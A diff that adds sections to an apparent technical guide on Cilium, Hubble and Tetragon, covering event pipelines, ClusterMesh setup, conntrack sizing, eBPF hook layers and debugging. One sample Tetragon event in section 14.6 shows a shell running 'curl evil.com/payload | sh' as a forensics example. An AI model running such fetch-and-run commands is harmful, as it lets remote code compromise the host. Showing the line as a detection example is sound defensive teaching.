@@ -1686,6 +1686,61 @@ hubble_tcp_flags_total{flag="SYN", source="shop/frontend"} 9999
 
 This is the kind of dashboarding that previously required a sidecar mesh (Istio/Envoy with stats sinks). With Hubble it's "free" because the data was already in the datapath.
 
+### 13.4.1 The Event Pipeline in Detail
+
+```
+┌────────────────────────────────────────────────────────────────────────────┐
+│   Hubble Event Pipeline                                                    │
+├────────────────────────────────────────────────────────────────────────────┤
+│                                                                            │
+│   BPF program (any: bpf_lxc, bpf_host, bpf_sock, etc.)                     │
+│        │                                                                   │
+│        │  on interesting event (policy verdict, drop, capture, L7)         │
+│        │  call:                                                            │
+│        │     send_trace_notify(ctx, OBSERVATION_POINT_TO_LXC, ...)         │
+│        │  which expands to:                                                │
+│        │     bpf_ringbuf_output(&cilium_events,                            │
+│        │                        &event, sizeof(event), 0)                  │
+│        ▼                                                                   │
+│   Kernel ring buffer (cilium_events, BPF_MAP_TYPE_RINGBUF)                 │
+│        │                                                                   │
+│        ▼  poll(2) wakes the agent                                          │
+│   cilium-agent's monitor goroutine                                         │
+│        │                                                                   │
+│        │  parse the binary event into a structured TraceNotify             │
+│        │  enrich with:                                                     │
+│        │    - source identity → labels (from local identity cache)         │
+│        │    - destination identity → labels                                │
+│        │    - source pod name, namespace (from IPCache reverse lookup)     │
+│        │    - destination pod name, namespace                              │
+│        │    - L7 fields (if Envoy contributed an L7 event via its access   │
+│        │      log to the agent's hubble-relay gRPC)                        │
+│        ▼                                                                   │
+│   In-memory ring buffer in the agent (default 4k events per CPU)           │
+│        │                                                                   │
+│        │  served over gRPC via the Observer service on hubble.sock         │
+│        ▼                                                                   │
+│   hubble-relay (cluster-wide Deployment)                                   │
+│        │                                                                   │
+│        │  fan-out: dials every node's hubble.sock                          │
+│        │  merge streams, de-dup, serve unified Observer gRPC               │
+│        ▼                                                                   │
+│   ┌────────────────┐  ┌──────────────────┐  ┌──────────────────────┐      │
+│   │ hubble CLI     │  │ hubble UI        │  │ metrics scraper       │      │
+│   │ (observe)      │  │ (browser)        │  │ (Prometheus)          │      │
+│   └────────────────┘  └──────────────────┘  └──────────────────────┘      │
+│                                                                            │
+└────────────────────────────────────────────────────────────────────────────┘
+```
+
+The ring buffer is per-CPU (`BPF_MAP_TYPE_RINGBUF` is actually MPSC since 5.8) and lock-free. Producers (the BPF programs) never block; if the buffer is full, the event is dropped and an overflow counter increments. The consumer (the agent) uses `epoll` to wake on data and drains in batches.
+
+For very high event rates, you can:
+- Increase the ring buffer size (`monitor.eventBufferSize`).
+- Sample events probabilistically (`hubble.eventBufferCapacity`, `monitor.maxQueueSize`).
+- Filter at the BPF level (only emit drops, not all forwards).
+- Skip aggregation on hot flows (`monitor.aggregation: medium`).
+
 ### 13.5 Tradeoffs
 
 Hubble events are *sampled* when the rate is high (configurable). At very high packet rates the ringbuf can drop events under back pressure; the verdict is *never* affected (events are emitted after the packet is forwarded or dropped), only the observability is. For audit-quality logging you still need persistent stores (Loki, S3 via fluentbit, etc.).
@@ -1780,6 +1835,63 @@ spec:
         - matchCapabilities: [{ type: Effective, operator: In, values: [CAP_NET_ADMIN] }]
           matchActions: [{ action: Post }]
 ```
+
+### 14.6 Process Tree and Pod Context
+
+Tetragon enriches every event with the full process ancestry and Kubernetes context:
+
+```json
+{
+  "process_exec": {
+    "process": {
+      "exec_id": "kind-control-plane:9876543:1234",
+      "pid": 1234,
+      "uid": 0,
+      "cwd": "/",
+      "binary": "/bin/sh",
+      "arguments": "-c 'curl evil.com/payload | sh'",
+      "flags": "execve rootcwd clone",
+      "start_time": "2024-10-07T14:33:12Z",
+      "auid": 1000,
+      "pod": {
+        "namespace": "default",
+        "name": "frontend-x4z9",
+        "container": {
+          "id": "containerd://abc123...",
+          "name": "app",
+          "image": {
+            "id": "sha256:...",
+            "name": "myorg/frontend:v1.4.2"
+          }
+        },
+        "pod_labels": {
+          "app": "frontend",
+          "env": "prod"
+        },
+        "workload": "frontend",
+        "workload_kind": "Deployment"
+      },
+      "parent_exec_id": "kind-control-plane:9876540:1232"
+    },
+    "parent": {
+      "exec_id": "kind-control-plane:9876540:1232",
+      "binary": "/bin/sh",
+      ...
+    }
+  }
+}
+```
+
+The "parent" chain is tracked all the way to the container's init (the `pause` container or the actual ENTRYPOINT). This makes forensics straightforward: who spawned this `/bin/sh`? Was it part of the application's startup or was it injected later via `kubectl exec` or via an RCE? The exec lineage answers that.
+
+### 14.7 Where Tetragon Beats Auditd
+
+Linux's traditional audit daemon (`auditd`) does much of this from userspace, but:
+
+- auditd produces enormous log volumes; in-kernel filtering with Tetragon's selectors drops 99% of events before they reach userspace.
+- auditd doesn't know about containers, namespaces, or Pods. Tetragon enriches with full K8s context natively.
+- auditd cannot enforce — only observe. Tetragon can kill or override.
+- auditd's rule language is brittle. TracingPolicy is declarative YAML.
 
 ---
 
@@ -1914,6 +2026,38 @@ The shared kvstore distributes identities. A Pod with labels `app=frontend, env=
 
 This is qualitatively different from federated mesh: it's not "two meshes that know about each other"; it's "two clusters whose datapaths and policies are unified."
 
+### 16.5 Setup
+
+```bash
+# Enable ClusterMesh in cluster A
+$ cilium clustermesh enable --context cluster-a --service-type LoadBalancer
+
+# Enable in cluster B
+$ cilium clustermesh enable --context cluster-b --service-type LoadBalancer
+
+# Connect them
+$ cilium clustermesh connect --context cluster-a --destination-context cluster-b
+
+# Verify
+$ cilium clustermesh status --context cluster-a
+✅ Cluster access information is available:
+  - cluster-b.mesh.cilium.io:2379
+✅ Service "clustermesh-apiserver" of type "LoadBalancer" found
+✅ All 3 nodes are connected to all clusters
+```
+
+The `cilium clustermesh connect` command exchanges TLS certificates and writes the remote cluster's etcd endpoint into both clusters' configurations. After that, agents in each cluster subscribe to the other's identity/endpoint/service updates.
+
+### 16.6 Topology-Aware Service Routing
+
+You often want "use local backends first, fall back to remote if none are available." With `service.cilium.io/affinity: local`:
+
+- Both clusters' frontend Services route to local backends when present.
+- If all local backends are unhealthy, requests fall over to remote.
+- Maglev hashing applies within each scope.
+
+For active-active scenarios where you want load to spread across clusters, set `affinity: none`. For DR-style where remote should be a cold spare, set `affinity: remote` on the failover side only after a controlled cutover.
+
 ---
 
 ## 17. WireGuard Transparent Encryption
@@ -2019,6 +2163,50 @@ Most of Cilium's memory in a steady state is in its BPF maps (kernel) and the ag
 - Envoy DaemonSet (if L7 enabled): ~100-300 MB
 
 At 5000-node, 50000-service scale, agent memory rises to 1-2 GB per node, primarily because of identity caches and the apiserver watch state.
+
+### 18.6 Connection-Tracking Capacity
+
+Even with socket-LB removing CT for ClusterIP, you still need CT for:
+- NodePort and LB traffic (where you must reverse-translate replies).
+- Egress masquerade (Pod talking to external IP via SNAT).
+- L7 proxy hairpin connections.
+
+Cilium uses its own BPF conntrack: `cilium_ct4_global` and `cilium_ct4_any` for IPv4 (v6 equivalents). Sizing is via:
+
+```yaml
+bpf:
+  ctTcpMax: 524288        # default 524288 TCP entries
+  ctAnyMax: 262144        # default 262144 non-TCP entries
+```
+
+At 524K entries × ~56 bytes each ≈ 30 MB per node. Way more than netfilter conntrack scales to.
+
+CT entries have idle timeouts — TCP entries timeout at `bpf.ctTcpLifetimeMax` (default 8h established, 1m SYN-only), UDP at `bpf.ctAnyLifetimeMax` (default 1m). Cilium periodically scans and GCs expired entries.
+
+### 18.7 The Watch Cache Pressure
+
+A subtle scaling concern: Cilium agents watch a *lot* of objects via the apiserver:
+
+- Endpoints / EndpointSlices (every service backend)
+- Services
+- Pods
+- Nodes
+- NetworkPolicies, CiliumNetworkPolicies, CiliumClusterwideNetworkPolicies
+- CiliumIdentities (in CRD mode)
+- CiliumNodes
+- CiliumEndpoints (sometimes; in CES mode aggregated)
+- Namespaces
+
+At 5000 nodes × 100 Pods × frequent rollouts, the apiserver's watch fan-out (chapter 05) becomes a hot path. CiliumEndpointSlice (CES) was introduced to aggregate per-node CEPs into batches so the apiserver doesn't see one CEP write per Pod state change.
+
+If your apiserver shows `etcd_object_counts{resource="ciliumendpoints"}` north of 100K, enable CES:
+
+```yaml
+ciliumEndpointSlice:
+  enabled: true
+```
+
+This packs up to 100 endpoints into one CES object, dropping write rate ~100x.
 
 ---
 
@@ -2130,6 +2318,53 @@ This is how Cilium claims tens-of-millions-of-pps LB throughput per node. It's a
 - The packet may not be contiguous; you may need `bpf_xdp_adjust_head` and head/meta manipulation for encap.
 
 For *Pod-to-Pod* traffic Cilium uses TC, not XDP, because TC has access to skb metadata (sk_buff features, qdisc semantics) and works on the per-Pod veth interfaces.
+
+### 20.5 XDP vs TC vs cgroup: The Layered View
+
+```
+┌────────────────────────────────────────────────────────────────────────────┐
+│                                                                            │
+│   Layer                              Hooks available           Cost/Power  │
+│   ──────────────────────────────────────────────────────────────────────   │
+│                                                                            │
+│   Application (userspace)           syscall tracepoints,                   │
+│                                     uprobes                                │
+│                                                                            │
+│   ╔══════════════════════════════════════════════════════════════╗         │
+│   ║ Socket layer                    cgroup hooks (connect4/6,    ║         │
+│   ║                                 sendmsg4/6, sock_ops, sk_msg)║         │
+│   ║                                 sk_lookup                    ║         │
+│   ║                                 LSM hooks (security_*)       ║         │
+│   ╠══════════════════════════════════════════════════════════════╣  cheap  │
+│   ║ TCP/IP stack                    fentry/kprobe on stack       ║         │
+│   ║                                 functions (tcp_v4_connect…)  ║         │
+│   ╠══════════════════════════════════════════════════════════════╣         │
+│   ║ Qdisc (tc) on netdev            BPF_PROG_TYPE_SCHED_CLS      ║         │
+│   ║                                 attached at clsact ingress   ║         │
+│   ║                                 and egress                   ║         │
+│   ╠══════════════════════════════════════════════════════════════╣         │
+│   ║ Driver / NAPI poll              BPF_PROG_TYPE_XDP            ║         │
+│   ║   (raw frame, no skb)           Return: PASS/DROP/TX/REDIRECT║  fast   │
+│   ╚══════════════════════════════════════════════════════════════╝         │
+│   NIC hardware (RX ring, DMA, IRQ, RSS)                                    │
+│                                                                            │
+│  - XDP runs *first*, before skb allocation. Fastest, narrowest API.        │
+│  - TC runs after skb but before netfilter / IP stack on the same netdev.   │
+│  - cgroup hooks run at *socket-layer* events (not packet-level), can       │
+│    rewrite addresses, drop, observe, but cannot see individual packets     │
+│    on an established connection.                                            │
+│                                                                            │
+└────────────────────────────────────────────────────────────────────────────┘
+```
+
+The right hook for a job depends on what state you need:
+
+- Need to make a per-packet forwarding decision based on packet contents? TC or XDP.
+- Need to make a per-flow decision at connection time, see source identity, modify the destination? cgroup (connect4).
+- Need to observe a syscall, kill a process, log a function call? tracing hooks (kprobe, fentry, tracepoint, LSM).
+- Need wire-rate packet processing with no other concerns? XDP.
+
+Cilium uses all of them.
 
 ---
 
@@ -2280,6 +2515,68 @@ $ cilium connectivity test
 ```
 
 This creates a set of test Pods, runs traffic across them, and verifies that connectivity, NetworkPolicy, and L7 enforcement all behave correctly. Run it after every Cilium install or upgrade.
+
+### 21.7 End-to-End Trace of a Single Ping
+
+Putting the debugging toolchain together: trace what happens when Pod A pings Pod B on another node, through Cilium tunnel mode, with policy enforcement and Hubble watching.
+
+```
+1. Pod A executes:  ping 10.244.2.17     # Pod B's IP, learned via DNS or directly
+
+2. Pod A's kernel routes:  default → cilium_host (gateway)
+   The packet leaves through Pod A's eth0 (veth peer of lxc1234 on the host).
+
+3. Host netns: tc ingress on lxc1234 fires bpf_lxc.c "from-container":
+      - parse Ethernet + IPv4
+      - source identity = SECLABEL (compiled-in for this endpoint)
+      - destination IP 10.244.2.17 → IPCache lookup → identity 67890, tunnel target = node2
+      - policy check: (src=12345, dst=67890, ICMP) → allow
+      - emit Hubble trace: { from=A, to=B, verdict=FORWARDED, type=TO_OVERLAY }
+      - bpf_redirect to cilium_vxlan
+
+4. cilium_vxlan: kernel VXLAN encap, outer destination = node2's IP, VNI = something
+   Packet leaves through eth0.
+
+5. Underlay network delivers to node2's eth0.
+
+6. node2 receives on eth0: tc ingress runs bpf_host.c "from-netdev":
+      - It's a VXLAN packet on the configured port (8472) → decap path
+   After decap, the inner packet arrives at cilium_vxlan.
+   
+7. node2 cilium_vxlan: tc ingress runs bpf_overlay.c "from-overlay":
+      - lookup destination identity in local IPCache → endpoint 67890 (Pod B)
+      - bpf_redirect_peer to Pod B's veth (lxc5678)
+
+8. Pod B's veth tc ingress: bpf_lxc.c "to-container":
+      - policy check on receive: (src=12345, dst=67890, ICMP, ingress) → allow
+      - emit Hubble trace: { …, verdict=FORWARDED, type=TO_LXC }
+      - deliver to Pod B's netns
+
+9. Pod B's kernel: ICMP echo request → reply, goes the reverse path.
+
+10. Hubble observe shows:
+        A → B: forwarded ICMP echo (3 hops in the trace: TO_OVERLAY, FROM_OVERLAY, TO_LXC)
+        B → A: forwarded ICMP echo reply
+```
+
+If something is dropped in this path, `cilium-dbg monitor -t drop` shows you exactly at which hook with which reason. That is the production debugging loop.
+
+### 21.8 When Cilium Itself Misbehaves
+
+Sometimes the problem is the agent, not the datapath. Useful artifacts:
+
+```bash
+# Get the agent's introspection JSON (long, but everything is in it)
+$ kubectl exec -n kube-system cilium-xxxxx -- cilium-dbg debuginfo --output json > debuginfo.json
+
+# Get a bundled sysdump for support (Cilium, Hubble, configs, logs, all of it)
+$ cilium sysdump --output-filename cilium-sysdump-$(date +%s)
+
+# Tail agent logs filtered for errors
+$ kubectl logs -n kube-system cilium-xxxxx -f | grep -E 'level=error|level=warning'
+```
+
+The `cilium sysdump` is what you attach to a GitHub issue. It includes BPF map dumps, agent state, recent events, K8s object snapshots, and kernel log fragments.
 
 ### 21.7 The Drop Notifications Map
 
